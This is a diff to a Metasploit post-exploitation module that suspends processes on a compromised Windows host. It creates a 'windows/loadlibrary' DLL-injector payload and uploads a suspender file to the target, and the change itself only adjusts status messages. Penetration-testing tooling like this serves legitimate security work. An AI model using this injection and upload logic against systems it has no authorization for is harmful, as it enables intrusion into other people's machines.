@@ -202,7 +202,7 @@ class Metasploit3 < Msf::Post
 	def suspend_using_dll(pids,delay,uploadpath,suspender)
 		begin
 			# Create payload, do this first so we don't have to delete files if this fails
-			print_status("Creating dll injector payload...")
+			vprint_status("Creating dll injector payload...")
 			pay = client.framework.payloads.create("windows/loadlibrary")
 			pay.datastore['DLL'] = uploadpath
 			pay.datastore['EXITFUNC'] = 'thread'
@@ -213,8 +213,8 @@ class Metasploit3 < Msf::Post
 		end
 		begin
 			# Upload suspender to target
-			print_status "Uploading Suspender to #{uploadpath}, you'll have to remove this " +
-			"manually as it will be in use until the suspended process is killed " + 
+			print_status "Uploading Suspender payload to #{uploadpath}, you'll have to remove this" +
+			" manually as it will be in use until the suspended process is killed " + 
 			"by you or by the system/user but I'll try to remove it anyways"
 			session.fs.file.upload_file("#{uploadpath}", "#{suspender}")
 			# TODO:  inject directly into memory instead of uploading first
